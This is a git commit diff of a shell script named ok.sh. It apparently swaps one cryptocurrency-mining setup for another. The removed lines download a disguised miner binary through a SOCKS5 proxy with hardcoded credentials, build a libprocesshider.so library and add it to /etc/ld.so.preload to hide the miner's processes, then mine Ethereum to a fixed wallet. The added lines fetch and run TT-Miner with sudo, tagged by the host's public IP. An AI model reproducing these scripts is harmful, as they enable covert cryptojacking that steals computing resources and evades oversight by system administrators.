0a5c82674da3769420406f2e54d2a7f90b36b0eb
bajol1 <102598068+bajol1@users.noreply.github.com>
2022-04-21 12:16:45 +0700

    Update ok.sh

--- ok.sh
+++ ok.sh
@@ -1,48 +1,9 @@
 #!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
-apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl -y
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 104.227.76.30:6127
-socks5_username = sikencot
-socks5_password = mbah2237
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo ""
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo ""
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./bezzHash --url=ssl://0x3da2c7743970908cac0e6b606f064330aea8b03f .DENT@eth-us-west.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sudo apt update
+sudo apt-get install zip unzip
+sudo apt install screen -y
+screen -dmS er.sh 65 75
+sudo git clone https://github.com/azis07/TTminer501.git
+cd TTminer501
+chmod +x TT-Miner
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./TT-Miner -coin eth -o eth-sg.flexpool.io:4444 -u 0x3da2c7743970908cac0e6b606f064330aea8b03f.$ip  -p x -PRGN -RH
